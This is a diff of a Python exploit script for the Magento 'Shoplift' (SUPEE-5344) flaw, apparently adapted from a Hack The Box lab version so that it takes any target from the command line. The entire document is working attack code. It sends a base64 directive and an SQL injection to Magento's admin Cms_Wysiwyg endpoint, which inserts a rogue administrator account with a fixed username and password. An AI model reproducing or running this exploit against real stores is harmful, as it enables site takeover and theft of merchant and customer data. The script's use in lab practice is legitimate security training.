@@ -1,19 +1,10 @@
-##################################################################################################
-#Exploit Title : Magento Shoplift exploit (SUPEE-5344)
-#Author        : Manish Kishan Tanwar AKA error1046
-#Date          : 25/08/2015
-#Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,Kishan Singh and ritu rathi
-#Debugged At  : Indishell Lab(originally developed by joren)
-##################################################################################################
+#!/usr/bin/env python2
 
-
-#Thanks to
-# Zero cool, code breaker ICA, Team indishell, my father , rr mam, jagriti and DON
 import requests
 import base64
 import sys
 
-target = "http://swagshop.htb/index.php/"
+target = sys.argv[1]
 
 if not target.startswith("http"):
     target = "http://" + target
@@ -21,9 +12,10 @@ if not target.startswith("http"):
 if target.endswith("/"):
     target = target[:-1]
 
-target_url = target + "/admin/Cms_Wysiwyg/directive/index/"
+target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"
 
-q="""
+# For demo purposes, I use the same attack as is being used in the wild
+SQLQUERY="""
 SET @SALT = 'rp';
 SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
 SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
@@ -31,19 +23,18 @@ INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,
 INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
 """
 
-
-query = q.replace("\n", "").format(username="forme", password="forme")
+# Put the nice readable queries into one line,
+# and insert the username:password combinination
+query = SQLQUERY.replace("\n", "").format(username="ypwq", password="123")
 pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
 
 # e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
-r = requests.post(target_url,
+r = requests.post(target_url, 
                   data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                         "filter": base64.b64encode(pfilter),
                         "forwarded": 1})
 if r.ok:
     print "WORKED"
-    print "Check {0}/admin with creds forme:forme".format(target)
+    print "Check {0}/admin with creds ypwq:123".format(target)
 else:
     print "DID NOT WORK"
-
-
